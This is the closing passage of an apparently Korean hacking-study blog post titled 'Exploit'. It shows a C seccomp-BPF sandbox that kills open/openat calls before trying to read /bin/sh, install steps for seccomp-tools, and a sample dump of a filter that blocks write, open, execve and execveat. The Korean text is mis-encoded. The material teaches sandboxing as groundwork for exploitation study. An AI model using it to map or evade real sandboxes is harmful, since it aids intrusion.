#include &lt;linux/unistd.h&gt;
#include &lt;stddef.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;unistd.h&gt;
#define DENY_SYSCALL(name)                                \
  BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_##name, 0, 1), \
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL)
#define MAINTAIN_PROCESS BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)
#define syscall_nr (offsetof(struct seccomp_data, nr))
#define arch_nr (offsetof(struct seccomp_data, arch))
/* architecture x86_64 */
#define ARCH_NR AUDIT_ARCH_X86_64
int sandbox() {
  struct sock_filter filter[] = {
      /* Validate architecture. */
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, arch_nr),
      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, ARCH_NR, 1, 0),
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
      /* Get system call number. */
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, syscall_nr),
      /* List allowed syscalls. */
      DENY_SYSCALL(open),
      DENY_SYSCALL(openat),
      MAINTAIN_PROCESS,
  };
  struct sock_fprog prog = {
      .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
      .filter = filter,
  };
  if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1) {
    perror(&#34;prctl(PR_SET_NO_NEW_PRIVS)\n&#34;);
    return -1;
  }
  if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) == -1) {
    perror(&#34;Seccomp filter error\n&#34;);
    return -1;
  }
  return 0;
}
int main(int argc, char* argv[]) {
  char buf[256];
  int fd;
  memset(buf, 0, sizeof(buf));
  sandbox();
  fd = open(&#34;/bin/sh&#34;, O_RDONLY);
  read(fd, buf, sizeof(buf) - 1);
  write(1, buf, sizeof(buf));
  return 0;
}
</code></pre></li></ul></li></ul></li></ul><h5 id=seccomp-tools>seccomp-tools<a hidden class=anchor aria-hidden=true href=#seccomp-tools>#</a></h5><ul><li>SECCOMP ë° BPFê°€ ì ìš©ëœ ì½”ë“œë¥¼ ë¶„ì„í•˜ê¸° ì‰½ê²Œ í•˜ëŠ” ë„êµ¬</li><li>ì„¤ì¹˜ë°©ë²•:<pre tabindex=0><code>sudo apt install gcc ruby-dev
sudo gem install seccomp-tools
</code></pre></li><li><a href=https://github.com/david942j/seccomp-tools>seccomp-tools git ì£¼ì†Œ</a></li><li>ì‚¬ìš©ë°©ë²•<ul><li><code>seccomp-tools dump FILE_NAME</code> : FILE_NAME ì— ëŒ€í•œ seccomp ë¶„ì„ ê²°ê³¼ í™•ì¸<ul><li>ì˜ˆì‹œ<pre tabindex=0><code> line  CODE  JT   JF      K
 =================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0010
 0006: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0010
 0007: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0010
 0008: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre></li></ul></li></ul></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://aswinblue.github.io/Blog/tags/c/>c</a></li><li><a href=https://aswinblue.github.io/Blog/tags/hacking/>hacking</a></li><li><a href=https://aswinblue.github.io/Blog/tags/assembly/>assembly</a></li></ul><nav class=paginav><a class=prev href=https://aswinblue.github.io/Blog/post/systemhacking/reverse_engineering/><span class=title>Â« Prev</span><br><span>Reverse Engineering</span></a>
<a class=next href=https://aswinblue.github.io/Blog/post/systemhacking/pwntool/><span class=title>Next Â»</span><br><span>Pwntool</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on twitter" href="https://twitter.com/intent/tweet/?text=Exploit&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f&amp;hashtags=C%2chacking%2cassembly"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f&amp;title=Exploit&amp;summary=Exploit&amp;source=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on reddit" href="https://reddit.com/submit?url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f&title=Exploit"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on whatsapp" href="https://api.whatsapp.com/send?text=Exploit%20-%20https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on telegram" href="https://telegram.me/share/url?text=Exploit&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><div class=auto-hide-div><ins class=kakao_ad_area style=display:none;position:fixed data-ad-unit=DAN-17Lk24lxFVgxtePU data-ad-width=160 data-ad-height=auto></ins></div><script type=text/javascript src=//t1.daumcdn.net/kas/static/ba.min.js async></script></div><footer class=footer><span>&copy; 2024 <a href=https://aswinblue.github.io/Blog>AswinBlue</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>